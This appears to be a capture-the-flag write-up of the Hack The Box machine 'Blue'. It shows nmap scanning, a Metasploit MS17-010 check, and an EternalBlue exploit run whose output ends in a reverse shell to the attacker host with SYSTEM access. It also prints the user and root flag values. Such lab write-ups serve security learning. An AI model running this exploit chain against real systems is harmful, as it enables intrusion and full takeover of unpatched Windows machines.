---
title: HTB-Blue
date: "2020-04-18"
description: easy box on HTB with eternal-blue vulnerabilty.
tldr: eternal-blue
tags: [linux,eternal-blue,htb]
---

## Information Gathering
The IP of the server is: `10.10.10.40`


## Scanning

### Nmap
Run a standard scan with Nmap to see what we're up against.

```shell
nmap -sC -sV -oA nmap/blue -T4 -p- 10.10.10.40  
  
  
Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-04-18 20:46 CEST  
Nmap scan report for 10.10.10.40  
Host is up (0.035s latency).  
Not shown: 65526 closed ports  
PORT STATE SERVICE VERSION  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)  
49152/tcp open msrpc Microsoft Windows RPC  
49153/tcp open msrpc Microsoft Windows RPC  
49154/tcp open msrpc Microsoft Windows RPC  
49155/tcp open msrpc Microsoft Windows RPC  
49156/tcp open msrpc Microsoft Windows RPC  
49157/tcp open msrpc Microsoft Windows RPC  
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
|_clock-skew: mean: -17m23s, deviation: 34m38s, median: 2m35s  
| smb-os-discovery:  
| OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)  
| OS CPE: cpe:/o:microsoft:windows_7::sp1:professional  
| Computer name: haris-PC  
| NetBIOS computer name: HARIS-PC\x00  
| Workgroup: WORKGROUP\x00  
|_ System time: 2020-04-18T19:50:46+01:00  
| smb-security-mode:  
| account_used: guest  
| authentication_level: user  
| challenge_response: supported  
|_ message_signing: disabled (dangerous, but default)  
| smb2-security-mode:  
| 2.02:  
|_ Message signing enabled but not required  
| smb2-time:  
| date: 2020-04-18T18:50:49  
|_ start_date: 2020-04-18T18:48:13  
  
Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 99.42 seconds
```

It's a windows 7 box with SMB open, so it smells a bit like eternal-blue, also the name is kind of a dead giveaway.

## Enumeration
Because of the box-name we're going straight for the juicy metasploit module to check if it's vulnerable. 

```shell
msf5 exploit(multi/samba/usermap_script) > use auxiliary/scanner/smb/smb_ms17_010  
msf5 auxiliary(scanner/smb/smb_ms17_010) > show options  
  
Module options (auxiliary/scanner/smb/smb_ms17_010):  
  
Name Current Setting Required Description  
---- --------------- -------- -----------  
CHECK_ARCH true no Check for architecture on vulnerable hosts  
CHECK_DOPU true no Check for DOUBLEPULSAR on vulnerable hosts  
CHECK_PIPE false no Check for named pipe on vulnerable hosts  
NAMED_PIPES /usr/share/metasploit-framework/data/wordlists/named_pipes.txt yes List of named pipes to check  
RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'  
RPORT 445 yes The SMB service port (TCP)  
SMBDomain . no The Windows domain to use for authentication  
SMBPass no The password for the specified username  
SMBUser no The username to authenticate as  
THREADS 1 yes The number of concurrent threads (max one per host)  
  
msf5 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.10.10.40  
RHOSTS => 10.10.10.40  
msf5 auxiliary(scanner/smb/smb_ms17_010) > run  
  
[+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)  
[*] 10.10.10.40:445 - Scanned 1 of 1 hosts (100% complete)  
[*] Auxiliary module execution completed
```

Success! it's vulnerable, time to fire the ION lasers! 


## Attack
Use the metasploit module, add parameters and fire away.

```shell
msf5 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue  
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options  
  
Module options (exploit/windows/smb/ms17_010_eternalblue):  
  
Name Current Setting Required Description  
---- --------------- -------- -----------  
RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'  
RPORT 445 yes The target port (TCP)  
SMBDomain . no (Optional) The Windows domain to use for authentication  
SMBPass no (Optional) The password for the specified username  
SMBUser no (Optional) The username to authenticate as  
VERIFY_ARCH true yes Check if remote architecture matches exploit Target.  
VERIFY_TARGET true yes Check if remote OS matches exploit Target.  
  
  
Exploit target:  
  
Id Name  
-- ----  
0 Windows 7 and Server 2008 R2 (x64) All Service Packs  
  
  
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40  
RHOSTS => 10.10.10.40  
msf5 exploit(windows/smb/ms17_010_eternalblue) > run  
  
[*] Started reverse TCP handler on 10.10.14.23:4444  
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check  
[+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)  
[*] 10.10.10.40:445 - Scanned 1 of 1 hosts (100% complete)  
[*] 10.10.10.40:445 - Connecting to target for exploitation.  
[+] 10.10.10.40:445 - Connection established for exploitation.  
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply  
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)  
[*] 10.10.10.40:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes  
[*] 10.10.10.40:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv  
[*] 10.10.10.40:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1  
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply  
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.  
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet  
[*] 10.10.10.40:445 - Starting non-paged pool grooming  
[+] 10.10.10.40:445 - Sending SMBv2 buffers  
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.  
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.  
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!  
[*] 10.10.10.40:445 - Receiving response from exploit packet  
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!  
[*] 10.10.10.40:445 - Sending egg to corrupted connection.  
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.  
[*] Command shell session 8 opened (10.10.14.23:4444 -> 10.10.10.40:49158) at 2020-04-18 21:05:08 +0200  
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=  
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=  
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=  
  
whoami  
nt authority\system
```

This smells pretty much like game over , since we're `nt authority\system` we can do whatever we like.

Gathered flags: 
```shell
C:\Users\haris\Desktop>type user.txt  
type user.txt  
4c546aea7dbee75cbd71de245c8deea9  
  
C:\Users\Administrator\Desktop>type root.txt  
type root.txt  
ff548eb71e920ff6c08843ce9df4e717
```


## EOF